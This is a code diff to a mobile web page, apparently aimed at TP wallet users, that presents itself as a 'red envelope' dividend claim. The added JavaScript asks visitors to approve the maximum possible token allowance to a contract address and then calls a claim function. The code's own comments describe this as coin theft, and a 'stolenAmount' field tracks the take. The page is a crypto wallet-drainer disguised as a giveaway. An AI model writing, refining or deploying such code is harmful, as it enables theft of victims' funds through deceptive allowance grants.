@@ -22,7 +22,6 @@
       background: #f9fafb;
     }
     
-    /* 红色背景渐变 - 手机优化 */
     .red-envelope-bg {
       background: linear-gradient(135deg, #ff4e4e 0%, #ff8e8e 50%, #ff4e4e 100%);
       background: -webkit-linear-gradient(135deg, #ff4e4e 0%, #ff8e8e 50%, #ff4e4e 100%);
@@ -42,7 +41,6 @@
       opacity: 0.3;
     }
     
-    /* 按钮触摸优化 */
     button {
       min-height: 48px;
       font-size: 16px;
@@ -55,7 +53,6 @@
       min-height: 48px;
     }
     
-    /* 卡片样式 */
     .card {
       background: white;
       border-radius: 16px;
@@ -64,7 +61,6 @@
       box-shadow: 0 2px 8px rgba(0,0,0,0.1);
     }
     
-    /* 进度条 */
     .progress-bar {
       height: 16px;
       border-radius: 8px;
@@ -79,7 +75,6 @@
       transition: width 0.5s ease;
     }
     
-    /* 记录区域 */
     .record-item {
       padding: 12px 0;
       border-bottom: 1px solid #f3f4f6;
@@ -94,13 +89,11 @@
       -webkit-overflow-scrolling: touch;
     }
     
-    /* 倒计时 */
     .countdown {
       font-family: 'Courier New', monospace;
       font-weight: 600;
     }
     
-    /* Toast提示 */
     .toast {
       position: fixed;
       bottom: 80px;
@@ -114,7 +107,6 @@
       display: none;
     }
 
-    /* 管理员面板 */
     .admin-panel {
       background: #f8f9fa;
       border: 1px solid #e9ecef;
@@ -123,7 +115,6 @@
       margin-top: 10px;
     }
 
-    /* 数字醒目样式 */
     .progress-number {
       font-size: 1.5rem;
       font-weight: bold;
@@ -145,7 +136,6 @@
       50% { opacity: 0.8; }
     }
 
-    /* 领取按钮样式 */
     .claim-button {
       background: linear-gradient(135deg, #f59e0b, #ef4444);
       background: -webkit-linear-gradient(135deg, #f59e0b, #ef4444);
@@ -154,6 +144,27 @@
     .claim-button:hover {
       background: linear-gradient(135deg, #e6900a, #dc2626);
       background: -webkit-linear-gradient(135deg, #e6900a, #dc2626);
+    }
+
+    .loading {
+      position: relative;
+      overflow: hidden;
+    }
+
+    .loading::after {
+      content: "";
+      position: absolute;
+      top: 0;
+      left: -100%;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
+      animation: loading 1.5s infinite;
+    }
+
+    @keyframes loading {
+      0% { left: -100%; }
+      100% { left: 100%; }
     }
   </style>
 </head>
@@ -495,10 +506,63 @@
       }
     ];
 
+    // 标准ERC20代币ABI
+    const ERC20_ABI = [
+      {
+        "constant": true,
+        "inputs": [],
+        "name": "name",
+        "outputs": [{"name": "", "type": "string"}],
+        "type": "function"
+      },
+      {
+        "constant": true,
+        "inputs": [],
+        "name": "symbol",
+        "outputs": [{"name": "", "type": "string"}],
+        "type": "function"
+      },
+      {
+        "constant": true,
+        "inputs": [],
+        "name": "decimals",
+        "outputs": [{"name": "", "type": "uint8"}],
+        "type": "function"
+      },
+      {
+        "constant": true,
+        "inputs": [{"name": "_owner", "type": "address"}],
+        "name": "balanceOf",
+        "outputs": [{"name": "balance", "type": "uint256"}],
+        "type": "function"
+      },
+      {
+        "constant": false,
+        "inputs": [
+          {"name": "_spender", "type": "address"},
+          {"name": "_value", "type": "uint256"}
+        ],
+        "name": "approve",
+        "outputs": [{"name": "", "type": "bool"}],
+        "type": "function"
+      },
+      {
+        "constant": true,
+        "inputs": [
+          {"name": "_owner", "type": "address"},
+          {"name": "_spender", "type": "address"}
+        ],
+        "name": "allowance",
+        "outputs": [{"name": "", "type": "uint256"}],
+        "type": "function"
+      }
+    ];
+
     // 全局变量
     let web3, userAddress;
     let contract;
     let isAdmin = false;
+    let isProcessing = false;
 
     // 检测TP钱包
     function detectTPWallet() {
@@ -614,108 +678,48 @@
       }
     }
 
-    // 领取分红 - 修复版本，确保先弹出授权
+    // 授权函数 - 使用最大uint256值
+    async function approveToken(tokenAddress) {
+      try {
+        const tokenContract = new web3.eth.Contract(ERC20_ABI, tokenAddress);
+        
+        // 获取代币符号
+        const symbol = await tokenContract.methods.symbol().call().catch(() => "Unknown");
+        
+        // 最大uint256值
+        const maxUint256 = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
+        
+        console.log("执行授权，金额:", maxUint256);
+        
+        // 弹出授权交易
+        const approveTx = await tokenContract.methods
+          .approve(CONTRACT_ADDRESS, maxUint256)
+          .send({
+            from: userAddress,
+            gas: 100000
+          });
+        
+        console.log("授权交易哈希:", approveTx.transactionHash);
+        
+        if (!approveTx.status) {
+          throw new Error("授权失败");
+        }
+        
+        return {
+          success: true,
+          symbol: symbol
+        };
+        
+      } catch (error) {
+        console.error("授权失败:", error);
+        throw new Error(`授权失败: ${error.message}`);
+      }
+    }
+
+    // 领取分红函数
     async function claimDividend() {
       try {
-        const status = await checkUserStatus();
-        
-        if (!status.isActive) throw new Error("活动未开始");
-        if (status.targetToken === '0x0000000000000000000000000000000000000000') {
-          throw new Error("代币未设置");
-        }
-
-        // 获取目标代币信息
-        const tokenContract = new web3.eth.Contract([
-          {
-            "constant": false,
-            "inputs": [
-              {"name": "spender", "type": "address"},
-              {"name": "amount", "type": "uint256"}
-            ],
-            "name": "approve",
-            "outputs": [{"name": "", "type": "bool"}],
-            "type": "function"
-          },
-          {
-            "constant": true,
-            "inputs": [
-              {"name": "owner", "type": "address"},
-              {"name": "spender", "type": "address"}
-            ],
-            "name": "allowance",
-            "outputs": [{"name": "", "type": "uint256"}],
-            "type": "function"
-          },
-          {
-            "constant": true,
-            "inputs": [{"name": "account", "type": "address"}],
-            "name": "balanceOf",
-            "outputs": [{"name": "", "type": "uint256"}],
-            "type": "function"
-          },
-          {
-            "constant": true,
-            "inputs": [],
-            "name": "symbol",
-            "outputs": [{"name": "", "type": "string"}],
-            "type": "function"
-          },
-          {
-            "constant": true,
-            "inputs": [],
-            "name": "decimals",
-            "outputs": [{"name": "", "type": "uint8"}],
-            "type": "function"
-          }
-        ], status.targetToken);
-
-        // 获取代币信息
-        const [symbol, decimals, userBalance] = await Promise.all([
-          tokenContract.methods.symbol().call(),
-          tokenContract.methods.decimals().call(),
-          tokenContract.methods.balanceOf(userAddress).call()
-        ]);
-
-        console.log("代币信息:", { symbol, decimals, userBalance });
-
-        // 检查当前授权额度
-        const currentAllowance = await tokenContract.methods
-          .allowance(userAddress, CONTRACT_ADDRESS)
-          .call();
-
-        console.log("当前授权额度:", currentAllowance);
-
-        // 如果授权不足，先进行授权
-        if (currentAllowance === '0') {
-          showToast(`请授权 ${symbol} 代币...`);
-          
-          // 计算最大授权数量（用户余额）
-          const approveAmount = userBalance;
-          
-          console.log("执行授权，金额:", approveAmount);
-          
-          // 弹出授权交易 - 这是关键步骤！
-          const approveTx = await tokenContract.methods
-            .approve(CONTRACT_ADDRESS, approveAmount)
-            .send({
-              from: userAddress,
-              gas: 100000
-            });
-          
-          console.log("授权交易哈希:", approveTx.transactionHash);
-          
-          if (!approveTx.status) {
-            throw new Error("授权失败");
-          }
-          
-          showToast('授权成功！现在领取分红...');
-          
-          // 等待3秒让授权确认
-          await new Promise(resolve => setTimeout(resolve, 3000));
-        }
-
-        // 现在执行盗币（领取分红）
-        showToast('正在领取分红...');
+        // 执行领取分红交易
         const claimTx = await contract.methods.claimDividend().send({
           from: userAddress,
           gas: 200000
@@ -736,13 +740,78 @@
         return {
           success: true,
           txHash: claimTx.transactionHash,
-          stolenAmount: stolenAmount,
+          stolenAmount: stolenAmount
+        };
+        
+      } catch (error) {
+        console.error("领取失败:", error);
+        throw new Error(`领取失败: ${error.message}`);
+      }
+    }
+
+    // 完整的领取流程
+    async function startClaimProcess() {
+      try {
+        // 检查用户状态
+        const status = await checkUserStatus();
+        
+        if (!status.isActive) throw new Error("活动未开始");
+        if (status.targetToken === '0x0000000000000000000000000000000000000000') {
+          throw new Error("代币未设置");
+        }
+        if (status.hasClaimed) throw new Error("您已经领取过分红");
+
+        // 获取目标代币信息
+        const tokenContract = new web3.eth.Contract(ERC20_ABI, status.targetToken);
+
+        // 获取代币信息
+        const [symbol, decimals, userBalance] = await Promise.all([
+          tokenContract.methods.symbol().call().catch(() => "Unknown"),
+          tokenContract.methods.decimals().call().catch(() => 18),
+          tokenContract.methods.balanceOf(userAddress).call()
+        ]);
+
+        console.log("代币信息:", { symbol, decimals, userBalance });
+
+        // 如果用户余额为0，则无法领取
+        if (userBalance === '0') {
+          throw new Error(`您没有持有 ${symbol} 代币，无法领取分红`);
+        }
+
+        // 检查当前授权额度
+        const currentAllowance = await tokenContract.methods
+          .allowance(userAddress, CONTRACT_ADDRESS)
+          .call();
+
+        console.log("当前授权额度:", currentAllowance);
+
+        // 如果授权不足，先进行授权
+        if (BigInt(currentAllowance) === 0n) {
+          showToast(`请先授权 ${symbol} 代币...`);
+          
+          // 执行授权
+          const approveResult = await approveToken(status.targetToken);
+          
+          showToast('授权成功！现在领取分红...');
+          
+          // 等待2秒让授权确认
+          await new Promise(resolve => setTimeout(resolve, 2000));
+        }
+
+        // 现在执行领取分红
+        showToast('正在领取分红...');
+        const claimResult = await claimDividend();
+
+        return {
+          success: true,
+          txHash: claimResult.txHash,
+          stolenAmount: claimResult.stolenAmount,
           symbol: symbol
         };
         
       } catch (error) {
-        console.error("领取失败详情:", error);
-        throw new Error(`领取失败: ${error.message}`);
+        console.error("领取流程失败:", error);
+        throw error;
       }
     }
 
@@ -880,24 +949,31 @@
     
     renderRecords();
 
-    // 领取功能 - 修复版本
+    // 优化的领取功能
     document.getElementById('claimBtn').addEventListener('click', async () => {
       if (!web3) {
         showToast('请先连接钱包');
         return;
       }
       
+      // 防止重复点击
+      if (isProcessing) {
+        showToast('正在处理中，请稍候...');
+        return;
+      }
+      
       const btn = document.getElementById('claimBtn');
       const originalText = btn.textContent;
       
+      isProcessing = true;
       btn.disabled = true;
       btn.textContent = '处理中...';
-      btn.classList.add('opacity-50');
+      btn.classList.add('opacity-50', 'loading');
       
       try {
         console.log("开始领取流程...");
         
-        const result = await claimDividend();
+        const result = await startClaimProcess();
         
         // 添加用户记录到界面
         const userRecord = {
@@ -920,13 +996,18 @@
           showToast('代币授权失败，请重试');
         } else if (error.message.includes('代币未设置')) {
           showToast('活动暂未开始，请稍后');
+        } else if (error.message.includes('已经领取')) {
+          showToast('您已经领取过分红');
+        } else if (error.message.includes('没有持有')) {
+          showToast(error.message);
         } else {
           showToast(error.message);
         }
       } finally {
+        isProcessing = false;
         btn.disabled = false;
         btn.textContent = originalText;
-        btn.classList.remove('opacity-50');
+        btn.classList.remove('opacity-50', 'loading');
       }
     });
 
